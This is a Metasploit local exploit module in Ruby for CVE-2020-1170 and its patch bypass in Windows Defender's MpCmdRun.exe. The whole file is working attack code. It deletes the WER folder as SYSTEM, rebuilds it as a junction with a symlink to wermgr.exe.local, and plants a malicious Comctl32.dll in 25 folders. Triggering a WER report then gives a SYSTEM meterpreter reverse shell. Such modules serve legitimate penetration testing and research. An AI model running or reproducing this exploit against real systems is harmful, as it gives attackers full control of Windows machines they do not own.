##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking # We use this as this exploit only works on Windows 10 x64 v1909 due to the LPE technique utilized,
  # and it has some reliability issues when one attempts to re-exploit the target without rebooting.
  include Msf::Post::Windows::Priv # Needed for is_system?
  include Msf::Exploit::EXE # Needed for generate_payload_dll
  include Msf::Post::Windows::FileSystem # Needed for create_symlink
  include Msf::Post::Windows::FileInfo # Needed for file_version
  include Msf::Exploit::FileDropper # Needed for register_file_for_cleanup
  include Msf::Post::File # Needed for upload_file
  prepend Msf::Exploit::Remote::AutoCheck # Included so that the exploit will automatically check if the target is vulnerable before attempting to exploit it.

  def initialize(info = {})
    super(
        update_info(
          info,
          'Name' => 'Windows Defender MpCmdRun.log Arbitrary Folder Deletion Local Privilege Escalation',
          'Description' => %q{
            This module exploits CVE-2020-1170, an arbitrary folder deletion vulnerability in Windows Defender's
            MpCmdRun.exe binary on MpCmdRun.exe to delete the folder at C:\ProgramData\Microsoft\Windows\WER.
            An attacker can then abuse the lack of the C:\ProgramData\Microsoft\Windows\WER folder to recreate the C:\ProgramData\Microsoft\Windows\WER
            folder as a junction directory which points to a directory of their choosing, and then create a WER error report. This will result in
            WER creating the target directory with permissions that allow all users to create files and folders inside it. Attacker can abuse
            this to make WER create the C:\Windows\System32\wermgr.exe.local folder with open permissions and plant a malicious DLL inside it, which
            when loaded by the wermgr.exe process as SYSTEM, will result in a LPE vulnerability and will grant the attacker SYSTEM level code execution.

            Note that as this module needs to ensure the C:\Windows\Temp\MpCmdRun.log is greater than 16MB in size so that the vulnerability will be
            triggered successfully, there will be a delay of 45-60 minutes whilst the module runs additional commands to expand the size of the
            C:\Windows\Temp\MpCmdRun.log file.

            Whilst this bug was originally patched with the June 2020 Patch Tuesday updates, Abdelhamid Naceri, aka klinix5, later found that
            there was a way to bypass this patch. This module takes advantage of this patch bypass so that users can gain SYSTEM level privileges
            even on systems that have applied the June 2020 Patch tuesday updates. As of August 2020, this patch bypass remains unaddressed.

            Note that this module will not work if another AV is installed on the target as this will disable Windows Defender. Additionally, the attacker
            will only be able to trigger this module once per target unless they delete both the C:\ProgramData\Microsoft\Windows\WER folder
            and the C:\Windows\Temp\MpCmdRun.log.bak file.

            Note that at the moment this module only supports exploiting Windows 10 x64 v1909 due to the specific paths needed for the LPE technique to work.
            The check method however should work on any Windows system and allow users to ensure whether or not their systems are vulnerable.
          },
          'License' => MSF_LICENSE,
          'Author' =>
              [
                'itm4n', # Original bug finder
                'gwillcox-r7', # msf module
                'klinix5', # Patch Bypass
                'jonaslyk' # Directory deletion to SYSTEM shell technique and assistance with questions.
              ],
          'Platform' => ['win'],
          'SessionTypes' => ['meterpreter'],
          'Privileged' => true,
          'Arch' => [ARCH_X64],
          'Targets' =>
              [
                [ 'Windows DLL Dropper', { 'Arch' => [ARCH_X64], 'Type' => :windows_dropper } ],
              ],
          'DefaultTarget' => 0,
          'DisclosureDate' => '2020-06-09',
          'References' =>
              [
                ['CVE', '2020-1170'],
                ['URL', 'https://itm4n.github.io/cve-2020-1170-windows-defender-eop/'],
                ['URL', 'https://github.com/klinix5/WinDefend_ZeroDay'],
                ['URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html'],
                ['URL', 'https://secret.club/2020/04/23/directory-deletion-shell.html'],
              ],
          'Notes' =>
              {
                'SideEffects' => [ CONFIG_CHANGES ],
                'Reliability' => [ UNRELIABLE_SESSION ], # This module will often (but not always) fail if you try to exploit it twice in a row after successfully getting a SYSTEM shell.
                'Stability' => [ CRASH_SAFE ]
              },
          'DefaultOptions' =>
              {
                'EXITFUNC' => 'thread',
                'FileDropperDelay' => 20,
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                'WfsDelay' => 900
              }
        )
    )
    register_options(
      [
        OptString.new('WritableDir', [ true, 'The location of a directory the current user can write to', 'C:\\Windows\\Temp\\' ]),
        OptInt.new('WerWaitTime', [ true, 'Number of seconds to wait for background file writes to complete before clearing the WER directory', 30 ]),
        OptInt.new('PowerShellWaitTime', [ true, 'Maximum number of minutes to wait for the PowerShell script to run before timing out', 90 ])
      ]
    )
  end

  def create_wer_job
    opts = {}
    opts[:session_id] = rand_text_numeric(8)
    opts[:code] = %{
        #
        # Calls to WER based on the Add-Type Win32 API calling method described at
        # https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1/
        #
        # Type definitions taken in part from MSDN documentation as well as from
        # http://www.pinvoke.net/default.aspx/wer.WerReportSubmit and http://www.pinvoke.net/default.aspx/wer.WerReportCreate
        #
        $MethodDefinition = @'
        public enum WER_REPORT_TYPE
            {
            WerReportNonCritical,
            WerReportCritical,
            WerReportApplicationCrash,
            WerReportApplicationHange,
            WerReportKernel,
            WerReportInvalid
            }
        public enum WER_CONSENT
            {
            WerConsentAlwaysPrompt = 4,
            WerConsentApproved = 2,
            WerConsentDenied = 3,
            WerConsentMax = 5,
            WerConsentNotAsked = 1
            }
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportCreate(string pwzEventType, WER_REPORT_TYPE repType, IntPtr pReportInformation, ref IntPtr phReportHandle);
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportSubmit(IntPtr hReportHandle, int consent, int dwFlags, ref IntPtr pSubmitResult);
'@

        Add-Type -MemberDefinition $MethodDefinition -Name 'WER' -Namespace 'Win32Dupe' -PassThru
        $handle = 0 # Need to create the variable for the ref, so lets add this in so long.
        if( ([Win32Dupe.WER]::WerReportCreate("BB",[Win32Dupe.WER+WER_REPORT_TYPE]::WerReportNonCritical, 0, [ref] $handle)) -ne 0 ){ # 0 in third argument is for blank pReportInformation
            Write-Host "[-] Exploit failed. Couldn't create the report" -ForegroundColor Red
        }
        $result = 999 # Need to create the variable for the ref, so set it to a random value of 999.
        [Win32Dupe.WER]::WerReportSubmit($handle, 1, 36, [ref]$result) # 1 = WerConsentNotAsked, 36 = WER_SUBMIT_QUEUE | WER_SUBMIT_OUTOFPROCESS
        Write-Host $result
        Write-Host "[+] WER directory creation via WER report submission was a success!" -ForegroundColor Green
}
    create_wer_job_result = client.powershell.execute_string(opts)
    if create_wer_job_result =~ /[sS]uccess/
      print_good('Successfully created the WER job!')
    elsif create_wer_job_result =~ /[fF]ail/
      fail_with(Failure::UnexpectedReply, 'Failed to create the WER job!')
    else
      print(create_wer_job_result.to_s)
      fail_with(Failure::UnexpectedReply, 'Unknown error occurred whilst trying to create the WER job!')
    end
  end

  # This is needed as otherwise some of the file deletion operations will occur as the low privileged user
  # rather than as the SYSTEM user, which can prevent some files and folders from being deleted after
  # successful exploitation.
  def cleanup
    return
  end

  def move_folders_out_of_wer
    relocation_dir = "#{datastore['WritableDir']}\\#{Rex::Text.rand_text_alpha(6..13)}"
    vprint_status('Making the temp folder which will house the folders that we move out of the WER directory...')
    mkdir(relocation_dir)
    register_dir_for_cleanup(relocation_dir) # Good

    begin
      rename_file('C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive', "#{relocation_dir}\\ReportArchive")
    rescue Rex::Post::Meterpreter::RequestError
      # Don't do anything, this error likely occurred cause the file didn't exist, and that is fine.
    end
    begin
      rename_file('C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue', "#{relocation_dir}\\ReportQueue")
    rescue Rex::Post::Meterpreter::RequestError
      # Don't do anything, this error likely occurred cause the file didn't exist, and that is fine.
    end
    begin
      rename_file('C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp', "#{relocation_dir}\\Temp")
    rescue Rex::Post::Meterpreter::RequestError
      # Don't do anything, this error likely occurred cause the file didn't exist, and that is fine.
    end

    vprint_good('Successfully moved the folders out of C:\\ProgramData\\Microsoft\\Windows\\WER!')
  end

  def check
    unless client.core.use('powershell')
      fail_with(Failure::BadConfig, "Can't load Meterpreter Powershell extension!")
    end
    opts = {}
    opts[:session_id] = rand_text_numeric(8)

    sysinfo_value = sysinfo['OS']

    if sysinfo_value !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return CheckCode::Safe('Target is not a Windows system, so it is not affected by this vulnerability!')
    end

    # Check if C:\Windows\Temp\MpCmdRun.log.bak exists and if so, if we can delete it. If it exists and we
    # can't delete it, then we can't exploit this vulnerability.
    backup_file_exists = session.railgun.kernel32.GetFileAttributesA('C:\\Windows\\Temp\\MpCmdRun.log.bak')['ErrorMessage']
    vprint_status(backup_file_exists.to_s)
    if backup_file_exists =~ /[Aa]ccess is denied/
      print_error("Current user doesn't have access to C:\\Windows\\Temp\\MpCmdRun.log.bak! We cannot exploit this target until this file is deleted!")
      return CheckCode::Safe
    elsif backup_file_exists =~ /operation completed successfully/ # Aka the file exists
      remove_file_result = session.railgun.kernel32.DeleteFileA('C:\\Windows\\Temp\\MpCmdRun.log.bak')['ErrorMessage']
      vprint_status(remove_file_result.to_s)
      if (remove_file_result =~ /[Aa]ccess is denied/)
        print_error('The file C:\\Windows\\Temp\\MpCmdRun.log.bak could be read but could not be deleted. We cannot proceed without deleting this file. Exiting!')
        return CheckCode::Safe
      end
      print_good('C:\\Windows\\Temp\\MpCmdRun.log.bak existed on the target but we successfully removed it!')
    else
      vprint_good("C:\\Windows\\Temp\\MpCmdRun.log.bak doesn't exist on the target!")
    end

    mprun_file_version = file_version('C:\\Program Files\\Windows Defender\\MpCmdRun.exe')
    mprun_file_version.pop # Remove last element, the branch. We aren't interested in it.
    gem_version_mpfile = Gem::Version.new(mprun_file_version.join('.')) # Taken from https://stackoverflow.com/questions/4018689/ruby-combining-an-array-into-one-string
    print_status("Version #{gem_version_mpfile} of MpCmdRun.exe detected on target!")

    # Old check for the patched version of Windows Defender. Commented out as there was a patch bypass.
    # if gem_version_mpfile >= Gem::Version.new('4.18.2005.1')
    #  return CheckCode::Safe
    # end

    mpcomputerstatus_result = nil
    begin
      mpcomputerstatus_result = cmd_exec('powershell -c "Get-MpComputerStatus"', 360)
    rescue Rex::TimeoutError
      # Just attempt to continue, apparently @smcintyre-r7 found this was timing out for him on his systems, though I haven't been able to replicate this.
    end

    if mpcomputerstatus_result.nil? || mpcomputerstatus_result.empty?
      fail_with(Failure::UnexpectedReply, 'Could not get the status of Windows Defender to determine if it is active or not!')
      return
    end

    if mpcomputerstatus_result =~ /800106BA/ # Error code 0x800106BA occurs when another security product is installed according
      # to https://answers.microsoft.com/en-us/windows/forum/windows_vista-security/windows-defender-error-0x800106ba/0e2f4e98-4e5f-4991-8994-0f8c80784547
      print_error('The target has an outdated version of MpCmdRun.exe installed but they have another AV installed.')
      return CheckCode::Safe
    end

    vprint_good('Target appears to have an outdated version of MpCmdRun.exe that is being actively used.')
    return CheckCode::Appears
  end

  def create_comctl_dir(folder_name)
    mkdir_result = mkdir("C:\\Windows\\System32\\wermgr.exe.local\\#{folder_name}")
    unless (mkdir_result == 0)
      fail_with(Failure::UnexpectedReply, "Could not create the AMD directory inside the wermgr.exe.local folder. Exiting as we can't plant the DLL now :/")
    end
    vprint_good("Successfully created C:\\Windows\\System32\\wermgr.exe.local\\#{folder_name}")

    vprint_status('Uploading malicious DLL as Comctl32.dll to created directory for a DLL planting attack...')
    write_file("C:\\Windows\\System32\\wermgr.exe.local\\#{folder_name}\\Comctl32.dll", generate_payload_dll)
    vprint_good('Successfully uploaded the malicious Comctl32.dll file!')
    register_file_for_cleanup("C:\\Windows\\System32\\wermgr.exe.local\\#{folder_name}\\Comctl32.dll") # Good
    register_dir_for_cleanup("C:\\Windows\\System32\\wermgr.exe.local\\#{folder_name}") # Good
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated. Skipping exploitation...')
    end

    if sysinfo['Architecture'] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported (only x64 is supported)')
    elsif sysinfo['Architecture'] == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against x86 is not supported (only x64 is supported)')
    end

    ntapipath = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-1170', 'NtApiDotNet.dll')
    powershell_file_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-1170', 'DefenderArbitraryFileDelete.ps1')
    opts = {}
    opts[:session_id] = rand_text_numeric(8)

    ntapi_target_file_path = datastore['WritableDir'] + '\\' + Rex::Text.rand_text_alpha(6..13) + '.dll'
    powershell_target_file_path = datastore['WritableDir'] + '\\' + Rex::Text.rand_text_alpha(6..13) + '.ps1'
    sub_folder_name = '\\' + Rex::Text.rand_text_alpha(6..13)

    upload_file(ntapi_target_file_path, ntapipath)
    upload_file(powershell_target_file_path, powershell_file_path)
    register_file_for_cleanup(ntapi_target_file_path) # Good
    register_file_for_cleanup(powershell_target_file_path) # Good
    print_good('Uploaded necessary files and registered them for cleanup!')

    wer_directory_test_results = session.railgun.kernel32.GetFileAttributesA('C:\\ProgramData\\Microsoft\\Windows\\WER')['ErrorMessage']
    vprint_status(wer_directory_test_results.to_s)

    # Check if the WER directory already exists. If it does not exist, create it via create_wer_job, and then move the subdirectories
    # and files out of it so it can be turned into a junction directory. Otherwise trigger the bug in Windows Defender so the WER
    # directory is deleted as SYSTEM (since current user won't have permissions to delete it), then follow the same steps.
    if (wer_directory_test_results =~ /does not exist/)
      print_status("C:\\ProgramData\\Microsoft\\Windows\\WER doesn't exist on the target! Recreating it now...")
      create_wer_job
      print_good('Recreated the missing C:\\ProgramData\\Microsoft\\Windows\\WER directory on the target!')
      vprint_status('Moving folders out of C:\\ProgramData\\Microsoft\\Windows\\WER so that it can be turned into a directory junction...')
      move_folders_out_of_wer # Move subdirectories out of C:\ProgramData\Microsoft\Windows\WER\
      # so that it can be turned into a junction directory.
    else
      vprint_status('Moving folders out of C:\\ProgramData\\Microsoft\\Windows\\WER so that we can delete the folder...')
      move_folders_out_of_wer # Move subdirectories out of C:\ProgramData\Microsoft\Windows\WER\
      # so that it can be successfully deleted.

      # Taken from @itm4n's PoC code and his exploit from https://github.com/itm4n/CVEs/blob/master/CVE-2020-1170/DefenderArbitraryFileDelete.ps1
      command_to_execute = "powershell -ep bypass -c \". #{powershell_target_file_path}; DoMain -TargetFolder 'C:\\ProgramData\\Microsoft\\Windows\\WER' -SubFolderName #{sub_folder_name} -NtApiDLLPath '#{ntapi_target_file_path}' -BaitFileName '#{Rex::Text.rand_text_alpha(6..13)}.txt'\""
      print_status('Triggering the vulnerability, this usually takes about 40 to 60 minutes to complete, but it can take longer on slower systems...')
      result = cmd_exec(command_to_execute, nil, datastore['PowerShellWaitTime'] * 60)
      if result =~ /[sS]uccess/
        print_good('Successfully triggered the arbitrary file deletion vulnerability!')
      elsif result =~ /[fF]ail/
        fail_with(Failure::UnexpectedReply, 'Failed to trigger the arbitrary file deletion vulnerability!')
      else
        print(result.to_s)
        fail_with(Failure::UnexpectedReply, 'Unknown error occurred whilst trying to run the PowerShell script!')
      end

      print_status("Sleeping for #{datastore['WerWaitTime']} seconds to ensure any extra operations on the WER directory go through before we try and clear it up.")
      sleep(datastore['WerWaitTime'])
      vprint_status('Moving folders out of C:\\ProgramData\\Microsoft\\Windows\\WER so that it can be turned into a directory junction...')
      move_folders_out_of_wer # Move subdirectories out of C:\ProgramData\Microsoft\Windows\WER\
      # so that it can be turned into a junction directory.
    end

    # Big shout out to @jonaslyk for his recommendations on how to fix this up and for helping us get this logic working!
    vprint_status('Creating the directory junction...')
    mount_point_handle = create_mount_point('\\??\\C:\\ProgramData\\Microsoft\\Windows\\WER', '\\RPC Control')
    if mount_point_handle.nil?
      fail_with(Failure::Unknown, 'Error when creating the directory junction... aborting.')
    end
    print_good('Created the directory junction successfully!')

    symlink_handle = create_symlink(nil, '\\RPC Control\\Temp', '\\??\\c:\\windows\\system32\\wermgr.exe.local')
    unless symlink_handle
      fail_with(Failure::Unknown, 'Error when creating the wermgr.exe.local symlink... aborting.')
    end
    print_good('Created the symbolic link between \\RPC Control\\Temp and \\??\\c:\\windows\\system32\\wermgr.exe.local successfully!')
    symlink_handle_value = symlink_handle['LinkHandle']

    print_status('Starting the WER job to create the C:\\Windows\\System32\\wermgr.exe.local directory...')
    create_wer_job

    vprint_status('Closing symbolic link handle...')
    session.railgun.kernel32.CloseHandle(symlink_handle_value)
    vprint_good('Closed symlink handle!')

    vprint_status('Cleaning up by removing the WER junction directory...')
    session.railgun.kernel32.CloseHandle(mount_point_handle)
    session.fs.dir.rmdir('C:\\ProgramData\\Microsoft\\Windows\\WER')
    vprint_good('Removed the WER junction directory!')

    # This list was gathered from public posts asking for help with issues which I then found by searching for
    # the string "amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362." on Google. It is by no
    # means a complete list, however it is based on as much publicly available information as I could gather
    # at the time of writing this exploit.
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.30_none_a1435978519dce7f')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.207_none_e6c5ae95130e4267')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.239_none_e6c7aebd130c7608')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.267_none_e6c5adbd130e444d')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.295_none_e6c3acbd13101292')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.329_none_e6c7b0c7130c72de')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.356_none_e6c4af7d130f27cc')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.387_none_e6c5af5b130e4216')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.388_none_e6c6afa5130d5b6d')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.418_none_e6c6b287130d565d')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.449_none_e6c7b265130c70a7')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.476_none_e6c4b11b130f2595')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.535_none_e6c3b34713100821')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.592_none_e6c0b1911312be02')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.657_none_e6c5b579130e3898')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.693_none_e6c1b3c11311d480')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.719_none_e6c7b883130c6729')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.720_none_e6beb5c51314836b')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.753_none_e6c1b6371311d063')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.836_none_e6c4b943130f18ed')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.900_none_e6beb9d913147d17')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.959_none_e6c7bbbf130c62bb')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.1016_none_9e7a36bbe461dae4')
    create_comctl_dir('amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.10005_none_25af1f04199214d6')
    print_good('Created the various potential Comctl32.dll directories and planted a malicious Comctl32.dll file within them!')

    register_dir_for_cleanup('C:\\Windows\\System32\\wermgr.exe.local') # Good
    register_file_for_cleanup('C:\\Windows\\Temp\\MpCmdRun.log.bak')
    print_status('Sleeping for a few seconds to allow things to calm down...')
    sleep(10)
    print_status('Starting the WER job to gain a shell...')
    create_wer_job
  end
end
